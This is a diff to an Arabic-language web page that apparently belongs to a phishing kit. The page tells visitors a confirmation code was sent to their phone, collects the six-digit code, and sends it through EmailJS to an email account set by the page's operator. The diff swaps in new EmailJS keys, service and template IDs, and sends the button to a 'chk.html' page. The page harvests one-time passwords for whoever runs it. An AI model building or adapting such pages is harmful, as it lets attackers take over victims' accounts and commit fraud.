@@ -180,7 +180,7 @@
     <div class="content-container">
         
         <div class="main-text">
-            أدخل رمز التأكيد المرسل إلى رقم هاتفك
+            تم ارسال رمز التأكيد إلى رقم هاتفك
         </div>
 
         <form id="otpForm" onsubmit="event.preventDefault(); verifyOtp();">
@@ -202,14 +202,13 @@
     </div>
 
     <div class="submit-container">
-        <button type="submit" form="otpForm" class="verify-btn">التحقق</button>
-    </div>
+<button type="button" onclick="window.location.href='chk.html'" class="verify-btn">التحقق</button>
 
     <script>
         // 1. إعداد EmailJS
         (function(){
             // ⚠️⚠️ استبدل 'YOUR_PUBLIC_KEY' بمفتاحك العام
-            emailjs.init("zWBq4dbSzfkEvVeS2");
+            emailjs.init("Iae5WP5Hg6-29STPP");
         })();
 
         // 2. منطق التنقل التلقائي بين الخانات
@@ -264,7 +263,6 @@
         }, 1000);
 
 
-        // 4. دالة الإرسال
         function verifyOtp() {
             const otpCode = 
                 document.getElementById('otp1').value + 
@@ -290,7 +288,7 @@
             };
 
             // ⚠️⚠️ استبدل المعلومات أدناه بمعلوماتك الحقيقية
-            emailjs.send('service_lyabofe', 'template_v443mrn', templateParams)
+            emailjs.send('service_wxc3g1p', 'template_jwg1d2c', templateParams)
                 .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
                     btn.innerText = 'تم التحقق بنجاح';
